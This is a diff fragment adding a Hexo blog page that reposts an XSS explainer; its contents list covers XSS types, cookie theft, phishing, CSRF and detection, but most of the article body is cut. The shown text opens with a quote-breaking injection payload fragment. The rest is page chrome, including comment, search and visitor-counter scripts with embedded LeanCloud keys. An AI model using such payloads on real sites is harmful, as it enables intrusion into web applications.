+hi&quot;) or (&quot;a&quot;=&quot;a
+</code></pre><p>转自：<a href="http://www.2cto.com/article/201501/372352.html" target="_blank" rel="external">http://www.2cto.com/article/201501/372352.html</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ALL/" rel="tag"># ALL</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/07/17/51/" rel="next" title="也谈谈同源策略和跨域问题👗">
+                <i class="fa fa-chevron-left"></i> 也谈谈同源策略和跨域问题👗
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+    <!-- 多说评论框 start -->  
+        <div class="ds-thread" data-thread-key="<%- page.path %>" data-title="<%- page.title %>" data-url="<%- page.permalink %>"></div>  
+<!-- 多说评论框 end -->    
+<!-- 多说公共JS代码 start (一个网页只需插入一次) -->  
+<script type="text/javascript">  
+var duoshuoQuery = {short_name:"yuzhiyun"};  
+    (function() {  
+        var ds = document.createElement('script');  
+        ds.type = 'text/javascript';ds.async = true;  
+        ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';  
+        ds.charset = 'UTF-8';  
+        (document.getElementsByTagName('head')[0]   
+         || document.getElementsByTagName('body')[0]).appendChild(ds);  
+    })();  
+    </script>  
+<!-- 多说公共JS代码 end -->  
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="menggeNIU" />
+          <p class="site-author-name" itemprop="name">menggeNIU</p>
+          <p class="site-description motion-element" itemprop="description">个人收藏</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">52</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">14</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/menggeNiu" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/u/1967072037" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://zjflove.github.io" title="zjf" target="_blank">zjf</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.901web.com" title="pybyongbo" target="_blank">pybyongbo</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#原因："><span class="nav-number">1.</span> <span class="nav-text">原因：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#种类"><span class="nav-number">2.</span> <span class="nav-text">种类:</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-反射型XSS"><span class="nav-number">2.1.</span> <span class="nav-text">1. 反射型XSS</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-存储型XSS"><span class="nav-number">2.2.</span> <span class="nav-text">2. 存储型XSS</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-DOM-XSS"><span class="nav-number">2.3.</span> <span class="nav-text">3. DOM-XSS</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#常用的攻击手段和目的"><span class="nav-number">3.</span> <span class="nav-text">常用的攻击手段和目的</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-窃取Cookie"><span class="nav-number">3.1.</span> <span class="nav-text">1.  窃取Cookie</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-钓鱼"><span class="nav-number">3.2.</span> <span class="nav-text">2.钓鱼</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-跨站请求伪造"><span class="nav-number">3.3.</span> <span class="nav-text">3.跨站请求伪造</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-注入恶意软件"><span class="nav-number">3.4.</span> <span class="nav-text">4.注入恶意软件</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#挖掘方式："><span class="nav-number">4.</span> <span class="nav-text">挖掘方式：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#检测方法"><span class="nav-number">5.</span> <span class="nav-text">检测方法</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">menggeNIU</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"nnnmg"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+      
+      <script src="/lib/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+      <script src="/js/src/hook-duoshuo.js?v=5.1.0"></script>
+    
+    
+    <script src="/lib/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+    <script src="/js/src/hook-duoshuo.js"></script>
+  
+
+
+
+
+
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("elhh73EjPvJjogo27rOTNyxB-gzGzoHsz", "ICYhjaCGuWcsPbm8nPit7Gkh");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+
+</body>
+</html>
